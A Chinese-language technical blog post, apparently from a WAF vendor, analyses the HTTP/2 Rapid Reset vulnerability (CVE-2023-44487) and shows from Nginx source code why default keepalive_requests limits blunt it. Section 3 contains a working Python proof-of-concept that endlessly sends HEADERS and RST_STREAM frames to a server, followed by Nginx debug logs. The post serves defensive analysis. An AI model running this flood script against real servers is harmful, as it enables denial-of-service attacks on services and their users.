# 深入分析 CVE-2023-44487 HTTP/2 快速重置攻击对 Nginx 的影响

[原文](https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/)&#x20;



最近安全圈公布了一个利用 HTTP/2 快速重置机制进行 DDoS 攻击的 0day 漏洞，[CVE-2023-44487](https://nvd.nist.gov/vuln/detail/CVE-2023-44487)，鉴于 HTTP/2 协议已经在 Internet 上广泛使用，所以该漏洞一经发布，在业界引起广泛关注。

[之前文章](https://zhuanlan.zhihu.com/p/647033026)我们介绍过，雷池 WAF 使用 Nginx 作为其代理模式下的流量转发引擎，Nginx 已经在其官网介绍了[该漏洞对 Nginx 的影响](https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/)。简单来说，Nginx 作为一款久经考验的 `Web 服务器/代理服务器`，其本身就提供过了多种方式来缓解 DDoS 攻击。具体到该漏洞，如果如下两个配置采用 Nginx 的默认值，那么该攻击对 Nginx 基本无影响：

* `keepalive_requests`：保持默认配置 1000
* `http2_max_concurrent_streams`：保持默认配置 128

需要说明的是，Nginx 1.19.7 及其之后版本是通过 `keepalive_requests` 来限制一个 HTTP/2 TCP 连接上请求总数量，而 1.19.7 之前的版本则是通过 `http2_max_requests` 来实现该目的。**当前雷池主线版本以上配置均保持默认值，所以该漏洞对雷池无影响**。

这篇文章我们会深入 Nginx 的源码，分析为什么 Nginx 的这两个配置能够缓解该漏洞对 Nginx 的攻击。

### 1. 漏洞的原理 <a href="#id-1.-lou-dong-de-yuan-li" id="id-1.-lou-dong-de-yuan-li"></a>

首先我们还是解释一下该漏洞的详细工作原理。

相比于 HTTP/1.1，HTTP/2 协议的一个显著优化就是 `单连接上的多路复用`：HTTP/2 允许在单个连接上同时发送多个请求，每个 HTTP 请求/响应使用不同的流。连接上的数据流被称为 `数据帧`，每个数据帧都包含一个固定的头部，用来描述该 `数据帧` 的类型、所属的流 ID 等。一些比较重要的 `数据帧` 类型包括：

* `SETTINGS` 帧：属于控制消息，用于传递关于 http2 连接的配置参数，例如 `SETTINGS_MAX_CONCURRENT_STREAMS` 就定义了该连接上的最大并发流数目
* `HEADERS` 帧：包含 HTTP headers
* `DATA` 帧：包含 HTTP body
* `RST_STREAM` 帧：直接取消一个流。如果客户端不想再接收服务端的响应，可以直接发送 `RST_STREAM` 帧

HTTP/2 协议支持设置一个 TCP 连接上 `最大并发流数目`，从而限制一个 tcp 连接上的 `in-flight` HTTP 请求数目。客户端可以通过发送 `RST_STREAM` 帧直接取消一个流，当服务端收到一个 `RST_STREAM` 帧时，会直接关闭该流，该流也不再属于 `活跃流`。

举个例子，假设当前 TCP 连接设置的 `最大并发流数目` 为 1，下图展示了 client 发送 req1 后，马上发送 req2，此时 server 并不会真正处理第二个请求，而是直接响应 `RST_STREAM`。只有在 server 处理完成 req1 后，client 才能接着发送下一个请求：

![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/blog/055d5a9074cf02d828d221c345336acf.png)

那如果 client 发送 req1 后，紧接着发送 `RST_STREAM`，此时 client 可以不停向 server 发送请求而中间不用等待任何响应，而 server 则陷入了不停地 `接受请求-处理请求-直接结束请求` 的循环中：

![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/blog/d50526fea2f58c9fb325bbdd6ecd31f8.png)

虽然 server 收到 `RST_STREAM` 后会直接结束当前请求的处理，**但是由于一般高性能服务器都是全异步模型，因此在优雅地结束当前请求处理前，可能已经消耗了部分系统资源来处理该请求（例如对于 proxy server，可能已经和 upstream 建立了连接）**。恶意攻击者就可以利用该漏洞，通过持续的 `HEADERS`、`RST_STREAM` 帧组合，消耗 Server 资源，进而影响 Server 正常请求的处理，造成 DDoS 攻击。

### 2. 对 Nginx 的影响 <a href="#id-2.-dui-nginx-de-ying-xiang" id="id-2.-dui-nginx-de-ying-xiang"></a>

接下来我们基于 Nginx 1.20.2 版本，分析为什么通过 `Nginx` 的 `http2_max_concurrent_streams` 和 `keepalive_requests` 配置，就能缓解该攻击的影响呢？首先下图展示了 Nginx 的 HTTP/2 的大致实现原理：

![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/blog/3d76d31074e4a0da0c69d24bf928275b.png)

可以看到，Nginx 对 HTTP/2 流量处理的核心实现逻辑是：

* 对于 HTTP/2 的 TCP 连接，Nginx 会为每个底层的 TCP 连接创建一个 `ngx_http_v2_connection_t` 结构
* 对 TCP 连接的上数据帧通过一个状态机进行解析，将解析后的数据帧仍然转换为标准的 `ngx_http_request_t`，进入通用的 HTTP 请求处理流程
* 网络连接上的每个流会创建一个 `ngx_connection_t`（称为 `fake connection`），请求中对应的连接字段会被设置为该 `fake connection`，用于满足请求的 Nginx HTTP 框架处理
* 当需要给 HTTP/2 连接返回响应时，通过 `ngx_http_v2_filter_module` 过滤模块将请求头转换为 HEADERS 帧，同时设置该 `fake connection` 上的 send\_chain 接口为 `ngx_http_v2_send_chain`，用于将请求 body 转换为 DATA 帧

当 `ngx_http_v2_create_stream()` 创建一个流时，**其会增加该 TCP 连接上的一个请求计数**：

```c
static ngx_http_v2_stream_t *
ngx_http_v2_create_stream(ngx_http_v2_connection_t *h2c, ngx_uint_t push)
{
    ......
    h2c->connection->requests++;
    ......
}
```

而每次收到 HEADERS 帧时，`ngx_http_v2_state_headers` 都会判断当前 tcp 连接上的请求数量是否已经达到最大值：

```c
static u_char *
ngx_http_v2_state_headers(ngx_http_v2_connection_t *h2c, u_char *pos,
    u_char *end)
{
    ......
    if (clcf->keepalive_timeout == 0
        // 判断该 TCP 连接上的请求数量是否达到最大值
        // 1.19.7 之前所比较的值是 h2scf->max_requests
        || h2c->connection->requests >= clcf->keepalive_requests
        || ngx_current_msec - h2c->connection->start_time
           > clcf->keepalive_time)
    {
        h2c->goaway = 1;

        if (ngx_http_v2_send_goaway(h2c, NGX_HTTP_V2_NO_ERROR) == NGX_ERROR) {
            return ngx_http_v2_connection_error(h2c,
                                                NGX_HTTP_V2_INTERNAL_ERROR);
        }
    }
    ......
}
```

由于 keepalive\_requests 配置的默认值为 1000，所以即使利用 `HEADERS`、`RST_STREAM` 帧序列来构造快速重置攻击，Nginx 也能够限制一个 TCP 连接上的请求总数量为 1000 个。如果攻击者想持续利用该漏洞，就不得不新建新的 TCP 连接，此时可以继续结合标准的 L4 监控告警工具来进一步加强防护。

### 3. 尝试复现 <a href="#id-3.-chang-shi-fu-xian" id="id-3.-chang-shi-fu-xian"></a>

接下来我们尝试复现该问题，确认一下上述逻辑。

首先准备一个如下 python http/2 client，其就是不断发送 HEADERS 帧和 RST\_STREAM 帧序列：

```python
#!/usr/bin/env python3

import socket
import ssl
import certifi

import h2.connection
import h2.events


SERVER_NAME = '127.0.0.1'
SERVER_PORT = 443

# generic socket and ssl configuration
socket.setdefaulttimeout(15)
ctx = ssl.create_default_context(cafile=certifi.where())
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(['h2'])

# open a socket to the server and initiate TLS/SSL
s = socket.create_connection((SERVER_NAME, SERVER_PORT))
s = ctx.wrap_socket(s, server_hostname=SERVER_NAME)

c = h2.connection.H2Connection()
c.initiate_connection()
s.sendall(c.data_to_send())

headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':authority', SERVER_NAME),
]

while True:
    stream_id = c.get_next_available_stream_id()
    print(stream_id)
    c.send_headers(stream_id, headers, end_stream=True)
    s.sendall(c.data_to_send())
    c.reset_stream(stream_id)
    s.sendall(c.data_to_send())

# tell the server we are closing the h2 connection
c.close_connection()
s.sendall(c.data_to_send())

# close the socket
s.close()
```

从 Nginx 的调试日志我们看到，在收到第 1000 个请求（sid 为 1999）时，Nginx 就发送了 GOAWAY 帧，之后即使该 TCP 连接上再收到 HTTP/2 HEADERS 帧和 RST\_STREAM 帧，这些帧都被忽略：

```bash
  // 接收到 HEADERS 帧
  107347 2023/10/16 15:26:48 [debug] 10#0: *5 http2 HEADERS frame sid:1999 depends on 0 excl:0 weight:16
  107348 2023/10/16 15:26:48 [debug] 10#0: *5 posix_memalign: 00007FCCB384E400:1024 @16
  107349 2023/10/16 15:26:48 [debug] 10#0: *5 posix_memalign: 00007FCCB383D000:4096 @16
  107350 2023/10/16 15:26:48 [debug] 10#0: *5 posix_memalign: 00007FCCB383B000:4096 @16

  // 发送 GOAWAY 帧
  107352 2023/10/16 15:26:48 [debug] 10#0: *5 http2 send GOAWAY frame: last sid 1999, error 0
  ......

  // 接收到 RST_STREAM 帧，当前请求直接结束
  107426 2023/10/16 15:26:48 [debug] 10#0: *5 http2 RST_STREAM frame, sid:1999 status:0
  107427 2023/10/16 15:26:48 [info] 10#0: *5 client terminated stream 1999 with status 0 while connecting to upstream, client: 127.0.0.1, server: _, r
  107428 2023/10/16 15:26:48 [debug] 10#0: *5 http run request: "/?"
  107429 2023/10/16 15:26:48 [debug] 10#0: *5 http upstream check client, write event:0, "/"
  107430 2023/10/16 15:26:48 [debug] 10#0: *5 finalize http upstream request: 499
  107431 2023/10/16 15:26:48 [debug] 10#0: *5 finalize http proxy request
  107432 2023/10/16 15:26:48 [debug] 10#0: *5 free keepalive peer
  107433 2023/10/16 15:26:48 [debug] 10#0: *5 free rr peer 1 0
  107434 2023/10/16 15:26:48 [debug] 10#0: *5 close http upstream connection: 13
  107435 2023/10/16 15:26:48 [debug] 10#0: *5 free: 00007FCCB384AA80, unused: 48
  107436 2023/10/16 15:26:48 [debug] 10#0: *5 event timer del: 13: 1634765351
  107437 2023/10/16 15:26:48 [debug] 10#0: *5 reusable connection: 0
  107438 2023/10/16 15:26:48 [debug] 10#0: *5 http finalize request: 499, "/?" a:1, c:1
  107439 2023/10/16 15:26:48 [debug] 10#0: *5 http terminate request count:1
  107440 2023/10/16 15:26:48 [debug] 10#0: *5 http terminate cleanup count:1 blk:0
  ......

  // 后续再收到 HEADERS 帧和 RST_STREAM 帧，都会被忽略
  107453 2023/10/16 15:26:48 [debug] 10#0: *5 http2 frame type:1 f:5 l:4 sid:2001
  107454 2023/10/16 15:26:48 [debug] 10#0: *5 skipping http2 HEADERS frame
  107455 2023/10/16 15:26:48 [debug] 10#0: *5 http2 frame skip 4
  107456 2023/10/16 15:26:48 [debug] 10#0: *5 http2 frame complete pos:00007FCCB31846F7 end:00007FCCB3185744
  107457 2023/10/16 15:26:48 [debug] 10#0: *5 http2 frame type:3 f:0 l:4 sid:2001
  107458 2023/10/16 15:26:48 [debug] 10#0: *5 http2 RST_STREAM frame, sid:2001 status:0
  107459 2023/10/16 15:26:48 [debug] 10#0: *5 unknown http2 stream
```

### 4. 小结 <a href="#id-4.-xiao-jie" id="id-4.-xiao-jie"></a>

RST\_STREAM 帧也是 HTTP/2 对 HTTP/1.1 的优化之一，它能够让客户端在不关闭连接的情况下，直接取消一个流，让服务器少做 `无用功`。在收到 `RST_STREAM` 帧后，服务器会直接终止当前请求的处理。以上行为可以认为是协议层面上的设计，而实际实现上，高性能服务器都会采用某种异步处理模型，使得请求的处理、请求的结束并不是在一个上下文中，这就导致服务器在真正结束这个请求前已经消耗了部分资源来处理该请求。

**恶意攻击者就是通过持续的 `HEADERS`、`RST_STREAM` 帧序列，绕过服务器 `最大并发流` 数目限制，让 `实现不当` 的服务器无限制地消耗资源来处理那些 `在协议层面上本不需要处理的请求`**。而 Nginx 的 `keepalive_requests` 默认配置能够限制攻击者在一个 TCP 连接上发送的请求总数量为 1000，使得该漏洞对 Nginx 基本无影响。

Nginx 作为一款广泛使用的工业级 Web 服务器/代理服务器，本身就在防护 DDoS 方面提供了大量配置。轮子虽好，会用也难。Nginx 虽然功能强大，但其学习、开发、维护门槛较高。本文就以分析该漏洞为契机，向 Nginx 爱好者介绍一些 HTTP/2 基础知识以及 Nginx 的 HTTP/2 的大致实现。

### 5. Reference <a href="#id-5.-reference" id="id-5.-reference"></a>

* [HTTP/2 Rapid Reset Attack Impacting F5 NGINX Products](https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/)
* [HTTP/2 Rapid Reset: deconstructing the record-breaking attack](https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/)